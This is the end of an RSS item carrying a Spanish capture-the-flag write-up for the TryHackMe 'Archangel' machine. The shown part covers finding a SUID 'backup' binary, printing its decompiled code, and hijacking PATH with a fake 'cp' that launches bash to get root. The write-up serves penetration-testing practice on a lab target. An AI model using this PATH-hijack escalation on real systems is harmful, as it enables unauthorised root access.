&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;archangel@ubuntu:~$ ls -lah
ls -lah
total 48K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; archangel archangel 4.0K Feb  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 08:38 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root      root      4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:06 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 00:48 .bash_logout
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel 3.7K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 00:48 .bashrc
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; archangel archangel 4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:08 .cache
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; archangel archangel 4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 11:20 .local
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; archangel archangel 4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 01:36 myfiles
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 00:48 .profile
drwxrwx--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; archangel archangel 4.0K Nov &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 20:41 secret
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel   &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 11:20 .selected_editor
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; archangel archangel 4.0K Feb  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 08:39 .ssh
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel   &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 19:57 user.txt
archangel@ubuntu:~$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; secret
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; secret
archangel@ubuntu:~/secret$ ls -lah
ls -lah
total 32K
drwxrwx--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; archangel archangel 4.0K Nov &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 20:41 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; archangel archangel 4.0K Feb  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 08:38 ..
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root      root       17K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 16:40 backup
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root      root        &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 20:41 user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm&lt;span class=&#34;o&#34;&gt;{[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]}&lt;/span&gt;
archangel@ubuntu:~/secret$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Hacemos una pequeña enumeracion en busqueda de ejecutables con permisos SUID, logramos encontrar un archivo (&lt;code&gt;backup&lt;/code&gt;) el cual realiza una copia de todos los archivos de la carpeta &lt;code&gt;myfiles&lt;/code&gt; hacia &lt;code&gt;/opt/backupfiles&lt;/code&gt;, lo que no se toma en cuenta en el codigo es la direccion completa de &lt;code&gt;cp&lt;/code&gt;, por lo que podriamos modificar la variable &lt;code&gt;$PATH&lt;/code&gt; para que tome otro ejecutable llamado &lt;code&gt;cp&lt;/code&gt; antes que el original (&lt;code&gt;/bin/cp&lt;/code&gt;).&lt;br /&gt;

&lt;div id=&#34;69ad1409640af1dc&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;c&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;c41bea3acae43a54&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;archangel@ubuntu:~/secret$ find / -perm -4000 2&amp;gt;/dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;xargs ls -lah
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        31K Aug &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; /bin/fusermount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        43K Sep &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 00:13 /bin/mount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        63K Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /bin/ping
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        44K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /bin/su
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        27K Sep &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 00:13 /bin/umount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        17K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 16:40 /home/archangel/secret/backup
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        75K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/chfn
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        44K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/chsh
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        75K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/gpasswd
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        40K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/newgrp
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        59K Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/passwd
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root       146K Sep &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 20:29 /usr/bin/sudo
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        19K Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/traceroute6.iputils
-rwsr-xr-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root messagebus  42K Jun &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root        10K Mar &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root       427K Mar  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/openssh/ssh-keysign
archangel@ubuntu:~/secret$ which cp
which cp
/bin/cp
archangel@ubuntu:~/secret$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;44bd7a5588ab4a40&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;undefined8&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cp /home/user/archangel/myfiles/* /opt/backupfiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;69ad1409640af1dc\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;&lt;/p&gt;
&lt;p&gt;Creamos un script para que ejecute &lt;code&gt;bash&lt;/code&gt; con el nombre &lt;code&gt;cp&lt;/code&gt; y le damos permisos de ejecucion, tambien agregamos al inicio la direccion &lt;code&gt;/home/archangel/secret&lt;/code&gt; a la variable &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;archangel@ubuntu:~/secret$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; cp
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; cp
archangel@ubuntu:~/secret$ chmod +x cp
chmod +x cp
archangel@ubuntu:~/secret$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/archangel/secret/:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/archangel/secret/:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
archangel@ubuntu:~/secret$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
/home/archangel/secret/:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos el archivo &lt;code&gt;/home/archangel/secret/backup&lt;/code&gt;, logramos obtener una shell con usuario root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_213014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/archangel/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/archangel/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>lfi</category>
            
          
            
              <category>lfi log poisoning</category>
            
          
            
              <category>rce</category>
            
          
            
              <category>suid</category>
            
          
            
              <category>ghidra</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>